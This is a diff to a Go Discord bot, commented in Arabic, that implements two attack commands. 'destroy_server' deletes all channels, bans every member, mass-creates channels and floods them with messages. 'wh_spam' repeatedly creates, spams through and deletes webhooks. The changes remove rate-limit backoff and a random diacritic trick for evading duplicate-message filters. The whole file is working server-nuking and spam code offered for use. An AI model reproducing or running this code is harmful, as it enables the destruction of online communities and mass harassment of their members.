@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"math/rand"
 	"net/http"
 	"os"
 	"os/signal"
@@ -34,11 +33,10 @@ func main() {
 
 	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsAll
 
-	// تعريف الأمر الأول: تدمير السيرفر
 	cmdDestroy := "destroy_server"
 	commandDestroy := &discordgo.ApplicationCommand{
 		Name:        cmdDestroy,
-		Description: "أمر تدمير السيرفر (باند مضمون وسرعة صاروخية)",
+		Description: "أمر تدمير السيرفر",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
@@ -67,11 +65,10 @@ func main() {
 		},
 	}
 
-	// تعريف الأمر الثاني: سبام الويب هوك الديناميكي المطور
 	cmdWhSpam := "wh_spam"
 	commandWhSpam := &discordgo.ApplicationCommand{
 		Name:        cmdWhSpam,
-		Description: "أمر سبام ويب هوك السريع مع نظام تدوير وتكرار مضمون",
+		Description: "سبام ويب هوك (ينشئ 5، يرسل، ينتظر 3 ثواني، يحذف، ويكرر)",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionChannel,
@@ -112,7 +109,7 @@ func main() {
 				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 					Type: discordgo.InteractionResponseChannelMessageWithSource,
 					Data: &discordgo.InteractionResponseData{
-						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
+						Content: "❌ يجب أن تكون مشرفاً.",
 						Flags:   discordgo.MessageFlagsEphemeral,
 					},
 				})
@@ -122,7 +119,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري تدمير السيرفر وباند الأعضاء بالكامل في الخلفية...",
+					Content: "🚀 جاري تنفيذ التدمير...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -146,7 +143,7 @@ func main() {
 				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 					Type: discordgo.InteractionResponseChannelMessageWithSource,
 					Data: &discordgo.InteractionResponseData{
-						Content: "❌ يجب أن تكون مشرفاً لاستخدام هذا الأمر.",
+						Content: "❌ يجب أن تكون مشرفاً.",
 						Flags:   discordgo.MessageFlagsEphemeral,
 					},
 				})
@@ -156,7 +153,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 جاري تشغيل هجوم الويب هوكات المطور في الخلفية...",
+					Content: "🚀 تم بدء عملية سبام الويب هوكات (5 بـ 5)...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -178,15 +175,14 @@ func main() {
 
 	err = sess.Open()
 	if err != nil {
-		fmt.Println("خطأ في فتح الاتصال:", err)
+		fmt.Println("خطأ:", err)
 		return
 	}
 
-	// تسجيل الأوامر
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandDestroy)
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandWhSpam)
 
-	fmt.Println("🤖 البوت شغال الآن وجاهز لكلا الأمرين!")
+	fmt.Println("🤖 البوت شغال وجاهز!")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -201,7 +197,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		"Content-Type":  "application/json",
 	}
 
-	// 1. حذف الرومات القديمة
+	// 1. حذف الرومات
 	go func() {
 		req, _ := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 		for k, v := range headers {
@@ -231,131 +227,84 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}()
 
-	// 2. باند جميع الأعضاء
+	// 2. باند الأعضاء
 	go func() {
 		var userIDs []string
 		after := ""
-
 		for {
 			members, err := s.GuildMembers(guildID, after, 1000)
 			if err != nil || len(members) == 0 {
 				break
 			}
-
 			for _, member := range members {
 				userIDs = append(userIDs, member.User.ID)
 				after = member.User.ID
 			}
-
 			if len(members) < 1000 {
 				break
 			}
 		}
 
-		batchSize := 50
-		for i := 0; i < len(userIDs); i += batchSize {
-			end := i + batchSize
-			if end > len(userIDs) {
-				end = len(userIDs)
-			}
-
-			for _, uID := range userIDs[i:end] {
-				go func(id string) {
-					err := s.GuildBanCreate(guildID, id, 0)
-					if err != nil {
-						time.Sleep(150 * time.Millisecond)
-					}
-				}(uID)
-			}
-			time.Sleep(100 * time.Millisecond)
+		for _, uID := range userIDs {
+			go func(id string) {
+				s.GuildBanCreate(guildID, id, 0)
+			}(uID)
 		}
 	}()
 
-	// 3. إنشاء الرومات بسرعة صاروخية
+	// 3. إنشاء الرومات
 	var channelIDs []string
 	var mu sync.Mutex
 	var wg sync.WaitGroup
 
-	groupSize := 10
-	for i := 0; i < roomsCount; i += groupSize {
-		end := i + groupSize
-		if end > roomsCount {
-			end = roomsCount
-		}
+	for i := 0; i < roomsCount; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			payload, _ := json.Marshal(map[string]interface{}{
+				"name": roomName,
+				"type": 0,
+			})
+			req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
+			for k, v := range headers {
+				req.Header.Set(k, v)
+			}
 
-		for j := i; j < end; j++ {
-			wg.Add(1)
-			go func() {
-				defer wg.Done()
-				payload, _ := json.Marshal(map[string]interface{}{
-					"name": roomName,
-					"type": 0,
-				})
-				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
-				for k, v := range headers {
-					req.Header.Set(k, v)
-				}
+			resp, err := client.Do(req)
+			if err != nil {
+				return
+			}
+			defer resp.Body.Close()
 
-				resp, err := client.Do(req)
-				if err != nil {
-					return
+			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
+				var chResult map[string]interface{}
+				json.NewDecoder(resp.Body).Decode(&chResult)
+				if chID, ok := chResult["id"].(string); ok {
+					mu.Lock()
+					channelIDs = append(channelIDs, chID)
+					mu.Unlock()
 				}
-				defer resp.Body.Close()
-
-				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
-					var chResult map[string]interface{}
-					json.NewDecoder(resp.Body).Decode(&chResult)
-					if chID, ok := chResult["id"].(string); ok {
-						mu.Lock()
-						channelIDs = append(channelIDs, chID)
-						mu.Unlock()
-					}
-				} else if resp.StatusCode == 429 {
-					time.Sleep(200 * time.Millisecond)
-				}
-			}()
-		}
-		wg.Wait()
-		time.Sleep(30 * time.Millisecond)
+			}
+		}()
 	}
+	wg.Wait()
 
-	// 4. إرسال الرسائل مع حركات التشكيل
-	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
-	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}
-
-	for i := 0; i < len(channelIDs); i += groupSize {
-		end := i + groupSize
-		if end > len(channelIDs) {
-			end = len(channelIDs)
-		}
-
-		for _, chID := range channelIDs[i:end] {
-			go func(cID string) {
-				for m := 0; m < messagesCount; m++ {
-					diacriticsSalt := ""
-					for k := 0; k <= (m % 3); k++ {
-						diacriticsSalt += arabicDiacritics[rng.Intn(len(arabicDiacritics))]
-					}
-					finalMsg := messageContent + diacriticsSalt
-
-					msgPayload, _ := json.Marshal(map[string]string{"content": finalMsg})
-					msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
-					for k, v := range headers {
-						msgReq.Header.Set(k, v)
-					}
-
-					msgResp, err := client.Do(msgReq)
-					if err == nil {
-						if msgResp.StatusCode == 429 {
-							time.Sleep(500 * time.Millisecond)
-						}
-						msgResp.Body.Close()
-					}
-					time.Sleep(50 * time.Millisecond)
+	// 4. إرسال الرسائل
+	for _, chID := range channelIDs {
+		go func(cID string) {
+			for m := 0; m < messagesCount; m++ {
+				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
+				msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
+				for k, v := range headers {
+					msgReq.Header.Set(k, v)
 				}
-			}(chID)
-		}
-		time.Sleep(40 * time.Millisecond)
+
+				msgResp, err := client.Do(msgReq)
+				if err == nil {
+					msgResp.Body.Close()
+				}
+			}
+		}(chID)
 	}
 }
 
@@ -365,22 +314,20 @@ func executeWebhookSpamLoop(token, channelID, webhookName, messageContent string
 		"Content-Type":  "application/json",
 	}
 
-	sentMessages := 0
+	sent := 0
 
-	// لوب رئيسي يضمن استمرار الدورة (إنشاء 5 -> إرسال -> حذف -> انتظار 3 ثواني) لين يخلص العدد بالكامل
-	for sentMessages < messagesCount {
-		var wg sync.WaitGroup
-		var activeWebhooks []string
+	// يستمر يكرر لين يوصل عدد الرسائل المطلوب بالضبط
+	for sent < messagesCount {
+		var activeURLs []string
 		var mu sync.Mutex
+		var wg sync.WaitGroup
 
-		// 1. إنشاء 5 ويب هوكات دفعة واحدة
+		// الخطوة 1: إنشاء 5 ويب هوكات مع بعض دفعة واحدة
 		for i := 0; i < 5; i++ {
 			wg.Add(1)
 			go func() {
 				defer wg.Done()
-				payload, _ := json.Marshal(map[string]string{
-					"name": webhookName,
-				})
+				payload, _ := json.Marshal(map[string]string{"name": webhookName})
 				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(payload))
 				for k, v := range headers {
 					req.Header.Set(k, v)
@@ -396,79 +343,65 @@ func executeWebhookSpamLoop(token, channelID, webhookName, messageContent string
 					var wh map[string]interface{}
 					if json.NewDecoder(resp.Body).Decode(&wh) == nil {
 						if id, ok := wh["id"].(string); ok {
-							if tokenWh, ok := wh["token"].(string); ok {
-								whURL := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tokenWh)
+							if tkn, ok := wh["token"].(string); ok {
+								url := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tkn)
 								mu.Lock()
-								activeWebhooks = append(activeWebhooks, whURL)
+								activeURLs = append(activeURLs, url)
 								mu.Unlock()
 							}
 						}
 					}
 				}
 			}()
-			time.Sleep(20 * time.Millisecond)
 		}
 		wg.Wait()
 
-		// لو ما انصنعت ولا ويب هوك، ننتظر ثانية ونعيد المحاولة
-		if len(activeWebhooks) == 0 {
+		// لو ما انصنع ولا ويب هوك، ننتظر ثانية ونعيد المحاولة عشان ما يعلق
+		if len(activeURLs) == 0 {
 			time.Sleep(1 * time.Second)
 			continue
 		}
 
-		// 2. إرسال الرسائل لمدة 5 ثوانٍ باستخدام الـ 5 ويب هوكات الحالية
-		stopTime := time.Now().Add(5 * time.Second)
+		// الخطوة 2: الإرسال والتأكد أن الرسائل وصلت (التحقق من الكود 200 أو 201)
 		var spamWg sync.WaitGroup
+		for _, url := range activeURLs {
+			if sent >= messagesCount {
+				break
+			}
 
-		for time.Now().Before(stopTime) && sentMessages < messagesCount {
-			for _, whURL := range activeWebhooks {
-				if sentMessages >= messagesCount {
-					break
-				}
+			spamWg.Add(1)
+			go func(whURL string) {
+				defer spamWg.Done()
+				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
+				req, _ := http.NewRequest("POST", whURL, bytes.NewBuffer(msgPayload))
+				req.Header.Set("Content-Type", "application/json")
 
-				spamWg.Add(1)
-				go func(url string) {
-					defer spamWg.Done()
-					msgPayload, _ := json.Marshal(map[string]string{
-						"content": messageContent,
-					})
-					req, _ := http.NewRequest("POST", url, bytes.NewBuffer(msgPayload))
-					req.Header.Set("Content-Type", "application/json")
-
-					resp, err := client.Do(req)
-					if err != nil {
-						return
-					}
+				resp, err := client.Do(req)
+				if err == nil {
 					defer resp.Body.Close()
-
-					// التحقق أن الرسالة وصلت فعلاً قبل زيادة العداد
+					// التأكد الفعلي أن الرسالة وصلت بنجاح
 					if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
 						mu.Lock()
-						sentMessages++
+						sent++
 						mu.Unlock()
-					} else if resp.StatusCode == 429 {
-						time.Sleep(300 * time.Millisecond)
 					}
-				}(whURL)
-			}
-			time.Sleep(30 * time.Millisecond)
+				}
+			}(url)
 		}
 		spamWg.Wait()
 
-		// 3. حذف الـ 5 ويب هوكات الحالية فور انتهاء الـ 5 ثواني
-		for _, whURL := range activeWebhooks {
-			go func(url string) {
-				req, _ := http.NewRequest("DELETE", url, nil)
+		// الخطوة 3: الانتظار 3 ثواني بالضبط
+		time.Sleep(3 * time.Second)
+
+		// الخطوة 4: حذف الخمسة ويب هوكات اللي تم إنشاؤها
+		for _, url := range activeURLs {
+			go func(whURL string) {
+				req, _ := http.NewRequest("DELETE", whURL, nil)
 				resp, err := client.Do(req)
 				if err == nil {
 					resp.Body.Close()
 				}
-			}(whURL)
-		}
-
-		// 4. الانتظار لمدة 3 ثواني قبل بدء دورة جديدة (إنشاء 5 ويب هوكات جديدة) إذا لم يكتمل العدد
-		if sentMessages < messagesCount {
-			time.Sleep(3 * time.Second)
+			}(url)
 		}
 	}
 }
